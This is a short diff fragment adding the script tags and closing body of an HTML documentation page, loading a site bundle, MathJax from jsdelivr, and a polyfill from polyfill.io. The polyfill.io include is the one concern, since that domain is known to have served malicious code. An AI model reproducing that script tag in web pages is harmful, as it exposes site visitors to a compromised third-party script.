+      <script src="../assets/javascripts/bundle.e71a0d61.min.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
